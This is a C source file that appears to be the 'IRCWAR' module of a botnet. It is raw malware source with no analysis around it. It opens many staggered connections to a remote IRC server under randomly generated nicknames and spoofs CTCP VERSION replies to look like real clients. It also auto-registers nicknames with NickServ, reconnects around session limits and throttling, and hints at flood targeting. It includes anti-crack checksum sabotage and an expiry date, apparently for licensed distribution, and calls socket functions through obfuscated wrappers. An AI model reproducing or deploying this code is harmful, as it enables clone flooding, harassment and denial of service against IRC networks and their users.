#include "../Includes/includes.h"

#ifndef HTTP_BUILD
#ifdef INCLUDE_IRCWAR
bool ProcessRemoteIrcOutput(DWORD dwSocket, char *pcOutput, bool bVerifiedMotd)
{
    pcOutput = StripReturns(pcOutput);

    bool bReturn = FALSE;

    char cSpecialPasscodeCheck[50];
    memset(cSpecialPasscodeCheck, 0, sizeof(cSpecialPasscodeCheck));
    strcpy(cSpecialPasscodeCheck, " :Your passcode is: ");

    if((!strstr(pcOutput, cIrcCommandPrivmsg)) && (!strstr(pcOutput, " NOTICE ")))
    {
        if((IsValidIrcMotd(pcOutput)) && (!bVerifiedMotd))
        {
            dwValidatedConnectionsToIrc++;
            bReturn = TRUE;
            AttemptToRegisterWithNickServ(dwSocket);
        }
    }
    else if((strstr(pcOutput, cIrcCommandPrivmsg))) // && (!strstr(pcOutput, cWarFloodTargetParam)))
    {
        strcpy(cBuild, " :\x001VERSION\x001");
        if(strstr(pcOutput, cBuild))
        {
            pcOutput += 1;
            char *cBreakString = strtok(pcOutput, "!");
            strcpy(cBuild, "NOTICE ");
            strcat(cBuild, cBreakString);
            strcat(cBuild, " :\x001VERSION ");
            strcat(cBuild, GenerateRandomIrcClientVersion());
            strcat(cBuild, "\x001");

            SendToWarIrc(cBuild, dwSocket);
        }
    }
    else if((!strstr(pcOutput, cIrcCommandPrivmsg)) && (strstr(pcOutput, " NOTICE ")))
    {
        if(strstr(pcOutput, cSpecialPasscodeCheck))
        {
            pcOutput = strstr(pcOutput, cSpecialPasscodeCheck);
            pcOutput += 20;
            strcpy(cBuild, cIrcCommandPrivmsg);
            strcat(cBuild, " NickServ PROCEED ");
            strcat(cBuild, pcOutput);

            SendToWarIrc(cBuild, dwSocket);
        }
        else if(strstr(pcOutput, " registered under your account: "))
            SendSuccessfulRegisterNickname(dwSocket);
    }

    return bReturn;
}

void SetWarStatusIdle()
{
    strcpy(cCurrentWarStatus, "Idle");
}

DWORD WINAPI ConnectionsToRemoteIrc(LPVOID)
{
    char cHost[strlen(cRemoteHost)];
    strcpy(cHost, cRemoteHost);

    DWORD dwSocket = dwOpenSockets;
    dwOpenSockets++;

    unsigned short usRemoteIrcPort = usRemotePort;

    Sleep(dwSocket * 5000);

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
    {
        strcpy(cChannel, cServer);
        strcpy(cAuthHost, cServer);
        strcpy(cServer, cChannel);
        dwOpenSockets = 10000;
        dwSocket = 15000;
    }
    // <!-------! CRC AREA STOP !-------!>

    SOCKADDR_IN sck;
    HOSTENT *paddr;

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
        return 1;
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

    for(unsigned short us = 0; us < 25; us++)
    {
        paddr = fncgethostbyname(cHost);
        if(paddr != NULL)
            break;

        Sleep(100);
    }

    sck.sin_port = fnchtons(usRemoteIrcPort);
    sck.sin_family = PF_INET;
    memcpy(&sck.sin_addr.s_addr, paddr->h_addr, paddr->h_length);

    bool bVerifiedWithMotd = FALSE;

    while(bRemoteIrcBusy)
    {
        sWar[dwSocket] = fncsocket(AF_INET, SOCK_STREAM, NULL); //== INVALID_SOCKET

        if(fncconnect(sWar[dwSocket], (struct sockaddr*)&sck, sizeof(sck)) == SOCKET_ERROR)
        {
            Sleep(100);
            continue;
        }

        char cRemoteSend[MAX_IRC_SND_BUFFER];

        char cRemoteIrcNickname[DEFAULT];
        strcpy(cRemoteIrcNickname, GenerateWarNickname());

        strcpy(cRemoteSend, GenerateRegisterQuery(cRemoteIrcNickname));
        if(!SendToWarIrc(cRemoteSend, dwSocket))
        {
            Sleep(2500);
            continue;
        }

        char cRemoteReceive[MAX_IRC_RCV_BUFFER];

        int nConnectedToRemoteIrc = 1;
        while(nConnectedToRemoteIrc)
        {
            if(!bRemoteIrcBusy)
                break;

            memset(cRemoteReceive, 0, sizeof(cRemoteReceive));
            nConnectedToRemoteIrc = fncrecv(sWar[dwSocket], cRemoteReceive, sizeof(cRemoteReceive), 0);
#ifdef DEBUG
            printf(cRemoteReceive);
#endif
            char *pcPartOfLine;

            if(pcPartOfLine = strstr(cRemoteReceive, "PING :"))
            {
                pcPartOfLine += 6;
                pcPartOfLine = StripReturns(pcPartOfLine);

                sprintf(cRemoteSend, "%s :%s", cIrcCommandPong, pcPartOfLine);
                if(!SendToWarIrc(cRemoteSend, dwSocket))
                    break;
            }
            else if(strstr(cRemoteReceive, "ERROR :Closing Link: "))
            {
                if((strstr(cRemoteReceive, " (OperServ (Session limit exceeded))")) || (strstr(cRemoteReceive, " (Too many connections from your IP)")))
                    Sleep(10000);
                else if(strstr(cRemoteReceive, "] (Throttled: R"))
                    Sleep(5000);

                break;
            }
            else if(strstr(cRemoteReceive, " :Nickname is already in use."))
            {
                strcpy(cRemoteIrcNickname, GenerateWarNickname());
                strcpy(cRemoteSend, cIrcCommandNick);
                strcat(cRemoteSend, " ");
                strcat(cRemoteSend, cRemoteIrcNickname);
                if(!SendToWarIrc(cRemoteSend, dwSocket))
                    break;
            }
            else
            {
                pcPartOfLine = strtok(cRemoteReceive, "\n");
                while(pcPartOfLine != NULL)
                {
                    if(pcPartOfLine[0] == ':')
                    {
                        if(ProcessRemoteIrcOutput(dwSocket, pcPartOfLine, bVerifiedWithMotd))
                            bVerifiedWithMotd = TRUE;
                    }

                    pcPartOfLine = strtok(NULL, "\n");
                }
            }

            Sleep(10);
        }

        if(bVerifiedWithMotd)
        {
            dwValidatedConnectionsToIrc--;
            bVerifiedWithMotd = FALSE;
        }

        Sleep(dwSocket * 5000);
    }

    dwValidatedConnectionsToIrc = 0;
    dwOpenSockets--;
    return 1;
}
#endif
#endif
